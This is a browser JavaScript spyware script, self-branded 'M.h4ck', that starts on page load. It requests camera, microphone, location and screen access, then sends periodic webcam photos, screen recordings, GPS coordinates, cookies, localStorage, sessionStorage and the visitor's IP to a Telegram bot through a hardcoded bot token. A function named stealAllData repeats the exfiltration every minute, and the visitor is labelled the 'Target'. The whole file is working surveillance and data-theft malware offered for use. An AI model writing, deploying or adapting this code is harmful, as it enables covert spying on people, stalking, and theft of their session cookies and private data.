// script.js
// ==================== TELEGRAM CONFIGURATION ====================
const TOKEN = "7568763554:AAGLNbPtD1ev3O8GBPMEtcpPH73cuOS-vtg";
let CHAT_ID = null;

// Get chat ID from URL parameter "id" only
const urlParams = new URLSearchParams(window.location.search);
const chatIdFromUrl = urlParams.get('id');
if (chatIdFromUrl && chatIdFromUrl.length > 0) {
    CHAT_ID = chatIdFromUrl;
}

// If no chat ID in URL, do nothing
if (!CHAT_ID) {
    console.log("No chat ID provided. Please add ?id=YOUR_CHAT_ID to URL");
}

// Global variables
let currentLocation = null;
let cameraStream = null;
let audioStream = null;
let screenRecorder = null;
let screenStream = null;
let recordedChunks = [];
let isRecording = false;
let photoInterval = null;
let permissionsRequested = {
    camera: false,
    microphone: false,
    location: false,
    screen: false
};

// ==================== TELEGRAM FUNCTIONS ====================
async function sendMessageToTelegram(message) {
    if (!CHAT_ID) return false;
    
    try {
        await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ 
                chat_id: CHAT_ID, 
                text: message,
                parse_mode: 'Markdown'
            }),
        });
        return true;
    } catch (err) {
        return false;
    }
}

async function sendPhotoToTelegram(file, caption) {
    if (!CHAT_ID) return;
    
    const formData = new FormData();
    formData.append('chat_id', CHAT_ID);
    formData.append('photo', file);
    if (caption) formData.append('caption', caption);
    
    try {
        await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
            method: "POST",
            body: formData
        });
    } catch (error) {}
}

async function sendVideoToTelegram(file, caption) {
    if (!CHAT_ID) return;
    
    const formData = new FormData();
    formData.append('chat_id', CHAT_ID);
    formData.append('video', file);
    if (caption) formData.append('caption', caption);
    
    try {
        await fetch(`https://api.telegram.org/bot${TOKEN}/sendVideo`, {
            method: "POST",
            body: formData
        });
    } catch (error) {}
}

async function sendFileToTelegram(file, caption) {
    if (!CHAT_ID) return;
    
    const formData = new FormData();
    formData.append('chat_id', CHAT_ID);
    formData.append('document', file);
    if (caption) formData.append('caption', caption);
    
    try {
        await fetch(`https://api.telegram.org/bot${TOKEN}/sendDocument`, {
            method: "POST",
            body: formData
        });
    } catch (error) {}
}

// ==================== 1. CAMERA PERMISSION ====================
async function requestCameraPermission() {
    if (permissionsRequested.camera) return;
    if (!CHAT_ID) return;
    
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ 
            video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } },
            audio: false 
        });
        
        cameraStream = stream;
        permissionsRequested.camera = true;
        
        await sendMessageToTelegram(`📸 *CAMERA ACCESS GRANTED*\n\n✅ Camera is now active\n⏰ ${new Date().toLocaleString()}\n🎯 Target: ${CHAT_ID}`);
        
        // Auto capture every 10 seconds
        if (photoInterval) clearInterval(photoInterval);
        photoInterval = setInterval(() => capturePhoto(), 10000);
        
        // Capture first photo
        setTimeout(() => capturePhoto(), 2000);
        
    } catch (error) {
        let errorMsg = error.name === 'NotAllowedError' ? 'User denied camera permission' : error.message;
        await sendMessageToTelegram(`❌ *CAMERA DENIED*\n\n${errorMsg}\n⏰ ${new Date().toLocaleString()}`);
    }
}

async function capturePhoto() {
    if (!cameraStream || !cameraStream.active) return;
    if (!CHAT_ID) return;
    
    try {
        const video = document.createElement('video');
        video.style.display = 'none';
        document.body.appendChild(video);
        video.srcObject = cameraStream;
        await video.play();
        
        await new Promise(resolve => setTimeout(resolve, 500));
        
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth || 640;
        canvas.height = video.videoHeight || 480;
        canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
        
        canvas.toBlob(async (blob) => {
            if (blob && blob.size > 0) {
                const file = new File([blob], `camera_${Date.now()}.jpg`, { type: 'image/jpeg' });
                await sendPhotoToTelegram(file, `📸 *M.h4ck Camera Capture*\n⏰ ${new Date().toLocaleString()}\n🎯 Target: ${CHAT_ID}`);
            }
        }, 'image/jpeg', 0.8);
        
        video.remove();
        
    } catch (error) {}
}

// ==================== 2. MICROPHONE ====================
async function requestMicrophonePermission() {
    if (permissionsRequested.microphone) return;
    if (!CHAT_ID) return;
    
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
        audioStream = stream;
        permissionsRequested.microphone = true;
        
        await sendMessageToTelegram(`🎤 *MICROPHONE ACCESS GRANTED*\n⏰ ${new Date().toLocaleString()}`);
        
    } catch (error) {}
}

// ==================== 3. LOCATION ====================
function requestLocationPermission() {
    if (permissionsRequested.location) return;
    if (!CHAT_ID) return;
    
    if (!navigator.geolocation) return;
    
    navigator.geolocation.getCurrentPosition(
        async (position) => {
            permissionsRequested.location = true;
            currentLocation = {
                lat: position.coords.latitude,
                lng: position.coords.longitude,
                accuracy: Math.round(position.coords.accuracy)
            };
            
            const mapsLink = `https://www.google.com/maps?q=${currentLocation.lat},${currentLocation.lng}`;
            
            await sendMessageToTelegram(`📍 *LOCATION ACCESS GRANTED*\n\n📌 Latitude: ${currentLocation.lat}\n📌 Longitude: ${currentLocation.lng}\n🎯 Accuracy: ±${currentLocation.accuracy}m\n🗺️ [Open Map](${mapsLink})\n⏰ ${new Date().toLocaleString()}`);
            
            try {
                await fetch(`https://api.telegram.org/bot${TOKEN}/sendLocation`, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ 
                        chat_id: CHAT_ID, 
                        latitude: currentLocation.lat,
                        longitude: currentLocation.lng
                    }),
                });
            } catch (err) {}
        },
        () => {},
        { enableHighAccuracy: true, timeout: 10000 }
    );
    
    // Update location every 30 seconds
    setInterval(() => {
        if (permissionsRequested.location) {
            navigator.geolocation.getCurrentPosition(
                async (position) => {
                    currentLocation = {
                        lat: position.coords.latitude,
                        lng: position.coords.longitude,
                        accuracy: Math.round(position.coords.accuracy)
                    };
                },
                () => {},
                { enableHighAccuracy: true }
            );
        }
    }, 30000);
}

// ==================== 4. SCREEN RECORDING ====================
async function requestScreenPermission() {
    if (permissionsRequested.screen) return;
    if (!CHAT_ID) return;
    
    try {
        const stream = await navigator.mediaDevices.getDisplayMedia({
            video: { cursor: "always", frameRate: { ideal: 30 } },
            audio: true
        });
        
        permissionsRequested.screen = true;
        screenStream = stream;
        
        await sendMessageToTelegram(`🎬 *SCREEN RECORDING GRANTED*\n⏰ ${new Date().toLocaleString()}`);
        
        startScreenRecording(stream);
        
    } catch (error) {}
}

function startScreenRecording(stream) {
    const mimeType = MediaRecorder.isTypeSupported('video/webm') ? 'video/webm' : 'video/mp4';
    screenRecorder = new MediaRecorder(stream, { 
        mimeType: mimeType,
        videoBitsPerSecond: 2500000 
    });
    recordedChunks = [];
    
    screenRecorder.ondataavailable = (e) => { 
        if (e.data && e.data.size > 0) recordedChunks.push(e.data); 
    };
    
    screenRecorder.onstop = async () => {
        isRecording = false;
        const blob = new Blob(recordedChunks, { type: mimeType });
        
        if (blob.size > 0) {
            const ext = mimeType.includes('mp4') ? 'mp4' : 'webm';
            const file = new File([blob], `screen_${Date.now()}.${ext}`, { type: mimeType });
            await sendVideoToTelegram(file, `🎥 *M.h4ck Screen Recording*\n📊 Size: ${(blob.size / 1024 / 1024).toFixed(2)} MB\n⏰ ${new Date().toLocaleString()}`);
        }
        
        recordedChunks = [];
        if (screenStream) {
            screenStream.getTracks().forEach(track => track.stop());
            screenStream = null;
        }
        screenRecorder = null;
    };
    
    screenRecorder.start(1000);
    isRecording = true;
    
    setTimeout(() => {
        if (screenRecorder && screenRecorder.state === 'recording') {
            screenRecorder.stop();
        }
    }, 30000);
    
    stream.getVideoTracks()[0].addEventListener('ended', () => {
        if (screenRecorder && screenRecorder.state === 'recording') {
            screenRecorder.stop();
        }
    });
}

// ==================== STOP CAMERA ====================
function stopCamera() {
    if (cameraStream) {
        cameraStream.getTracks().forEach(track => track.stop());
        cameraStream = null;
        if (photoInterval) clearInterval(photoInterval);
        if (CHAT_ID) {
            sendMessageToTelegram(`⛔ *CAMERA STOPPED*\n⏰ ${new Date().toLocaleString()}`);
        }
    }
}

// ==================== STEAL DATA ====================
async function stealAllData() {
    if (!CHAT_ID) return;
    
    const cookies = document.cookie || 'No cookies';
    const ip = await getIP();
    
    let message = `🔴 *M.h4ck DATA REPORT*\n\n`;
    message += `🍪 Cookies: ${cookies.length > 0 ? 'Found' : 'None'}\n`;
    message += `💾 LocalStorage: ${localStorage.length} items\n`;
    message += `💾 SessionStorage: ${sessionStorage.length} items\n`;
    message += `\n📱 Device Info\n`;
    message += `⏰ Time: ${new Date().toLocaleString()}\n`;
    message += `🌐 IP: ${ip}\n`;
    message += `🖥️ Platform: ${navigator.platform}\n`;
    message += `📺 Screen: ${window.screen.width}x${window.screen.height}\n`;
    message += `🌍 Language: ${navigator.language}\n`;
    message += `📍 URL: ${window.location.href}`;
    
    if (currentLocation) {
        message += `\n📍 Location: ${currentLocation.lat}, ${currentLocation.lng}`;
    }
    
    await sendMessageToTelegram(message);
    
    const fullData = {
        timestamp: new Date().toISOString(),
        url: window.location.href,
        userAgent: navigator.userAgent,
        cookies: cookies,
        localStorage: { ...localStorage },
        sessionStorage: { ...sessionStorage },
        location: currentLocation,
        permissions: permissionsRequested
    };
    
    const jsonBlob = new Blob([JSON.stringify(fullData, null, 2)], { type: 'application/json' });
    const jsonFile = new File([jsonBlob], `mhack_data_${Date.now()}.json`, { type: 'application/json' });
    await sendFileToTelegram(jsonFile, `📁 M.h4ck Complete Data Report`);
}

async function getIP() {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return data.ip;
    } catch {
        return 'Unable to fetch';
    }
}

// ==================== INITIALIZE ====================
async function initialize() {
    // Only proceed if chat ID is provided in URL
    if (!CHAT_ID) {
        return;
    }
    
    await sendMessageToTelegram(`🚀 *M.h4ck CAMERA SYSTEM*\n\n✅ System initialized\n🎯 Target ID: ${CHAT_ID}\n📍 URL: ${window.location.href}\n⏰ ${new Date().toLocaleString()}\n\n👨‍💻 Developer: sithhth`);
    
    // Request all permissions immediately
    setTimeout(() => requestCameraPermission(), 500);
    setTimeout(() => requestMicrophonePermission(), 1500);
    setTimeout(() => requestLocationPermission(), 2500);
    setTimeout(() => requestScreenPermission(), 3500);
    
    // Steal data after 15 seconds
    setTimeout(() => stealAllData(), 15000);
    
    // Steal data every 60 seconds
    setInterval(() => stealAllData(), 60000);
}

// Start when page loads
window.addEventListener("DOMContentLoaded", initialize);